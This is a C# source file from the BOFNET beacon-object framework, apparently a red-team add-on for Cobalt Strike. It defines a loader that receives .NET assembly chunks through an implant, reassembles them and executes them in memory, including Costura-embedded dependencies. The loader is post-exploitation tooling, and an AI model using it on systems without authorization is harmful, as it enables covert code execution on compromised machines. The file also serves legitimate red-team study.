using BOFNET;
using BOFNET.Bofs;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

namespace BOFNET.Bofs {

    /// <summary>
    /// AssemblyLoader that supports feeding chunks of assembly data for large binaries (+1MB).  
    /// </summary>
    public class AssemblyLoader : BeaconObject {

        private static Dictionary<string, MemoryStream> activeAssemblyLoads = new Dictionary<string, MemoryStream>();

        BeaconApi api;

        public AssemblyLoader(BeaconApi api) : base(api) {
            this.api = api;
        }

        private void LoadAssembly(byte[] assemblyData) {
            Assembly assembly = Runtime.LoadAssembly(assemblyData);
            BeaconConsole.WriteLine($"[+] Loaded assembly {assembly.FullName} successfully");

            var assemblyLoaderType = assembly.GetType("Costura.AssemblyLoader", false);
            if (assemblyLoaderType != null) {
                BeaconConsole.WriteLine($"[=] Assembly has been prepared with Costura, running Cosutra embedded assembly loader");
                var attachMethod = assemblyLoaderType?.GetMethod("Attach", BindingFlags.Static | BindingFlags.Public);
                attachMethod?.Invoke(null, new object[] { });
            }
        }

        public override void Go(byte[] chunk) {

            Unpack unpack = new Unpack("Zib", chunk);

            string assemblyName = (string)unpack.Values[0];
            int chunkSize = (int)unpack.Values[1];
            byte[] assemblyChunk = (byte[])unpack.Values[2];
            MemoryStream assemblyData;

            if (!activeAssemblyLoads.ContainsKey(assemblyName)) {
                BeaconConsole.WriteLine($"[+] Setting up new loader with unique id {assemblyName}");
                assemblyData = new MemoryStream();                
                activeAssemblyLoads[assemblyName] = assemblyData;
            } else {                
                assemblyData = activeAssemblyLoads[assemblyName];
            }

            assemblyData.Write(assemblyChunk, 0, assemblyChunk.Length);

            if (assemblyChunk.Length < chunkSize) {   
                LoadAssembly(assemblyData.ToArray());
                activeAssemblyLoads.Remove(assemblyName);                
            } 
        }
    }
}
